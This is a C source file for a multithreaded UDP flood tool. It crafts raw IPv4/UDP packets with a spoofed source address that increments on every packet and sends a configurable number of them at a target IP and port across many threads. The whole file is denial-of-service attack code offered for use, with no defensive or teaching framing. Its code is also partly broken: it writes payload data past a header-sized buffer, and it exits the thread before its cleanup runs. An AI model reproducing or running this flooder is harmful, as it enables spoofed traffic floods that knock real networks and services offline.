#include "header.h"

#include "make_ipv4.h"
#include "udp_flood.h"

#define DATA "Hello, This is Data!"

int udp_total;
int udp_produced;

int udp_per_seicmp_cond;
int udp_duration;
double udp_elapsed_time;

char *udp_dest_ip;
char *udp_src_ip;
int udp_src_port;
int udp_dest_port;

pthread_mutex_t udp_mutex;
pthread_cond_t udp_cond;

int udp_generated_count;


void udp_flood_print_usage(void)
{
	printf("UDP flood Usage : [Src-IP] [Dest-IP] [Src-Port] [Dest-Port] [# thread] [# requests] \n");
}

void* generate_udp_request(void *data)
{
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_UDP);
	while (1) {

		struct udphdr *p;
		char buffer[sizeof(struct udphdr)];

		memset(buffer, 0x00, sizeof(struct udphdr));

		//make protocol
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_UDP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(udp_src_ip));

		//modify udp_src_ip, increment 1.
		next_ip_addr(udp_src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(udp_dest_ip));

		p = (struct udphdr *) buffer;
		p->check = 0;
		p->src_port = htons(udp_src_port);
		p->dest_port = htons(udp_dest_port);
		strcpy(p->data, DATA);
		p->len = htons(strlen(DATA));

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct udphdr));
		char *packet = packet_assemble(ipv4_h, p, sizeof(struct udphdr));

		pthread_mutex_lock(&udp_mutex);

		if (udp_produced >= udp_total) {
			pthread_mutex_unlock(&udp_mutex);
			pthread_cond_broadcast(&udp_cond);
			return 0;
		}

		send_packet(sock, ipv4_h, packet, udp_src_port);
		udp_generated_count++;
		free(packet);
		udp_produced++;

		pthread_mutex_unlock(&udp_mutex);
	}
	close(sock);
	return 0;
}


void udp_flood_run(char *argv[])
{
	udp_src_ip = (char*) malloc(sizeof(char) * 20);

	int argc = 0;
	udp_generated_count=0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (argc != 6) {
		udp_flood_print_usage();
		return;
	}

	strcpy(udp_src_ip, argv[0]);

	udp_mutex = PTHREAD_MUTEX_INITIALIZER;

	udp_src_port = atoi(argv[2]);
	udp_dest_port = atoi(argv[3]);

	udp_produced = 0;
	udp_total = atoi(argv[5]);

	int num_threads = atoi(argv[4]);

	udp_dest_ip = argv[1];

	int *generate_thread_id;
	pthread_t *generate_thread;


	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads+1));
	generate_thread = (pthread_t*) malloc(sizeof(pthread_t) * (num_threads+1));
	int i;


	printf("Sending UDP requests to %s using %d threads\n",udp_dest_ip, num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;


	for (i = 0; i < num_threads; i++) 
		pthread_create(&generate_thread[i], NULL, generate_udp_request,
			(void*) &generate_thread_id[i]);

	for (i = 0; i < num_threads; i++) {
		void *status;
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}



	pthread_mutex_destroy(&udp_mutex);
	pthread_exit(NULL);

	printf("UDP flood finished\nTotal %d packets sent.\n",udp_generated_count);

	free(generate_thread_id);
	free(generate_thread);
	free(udp_src_ip);
}
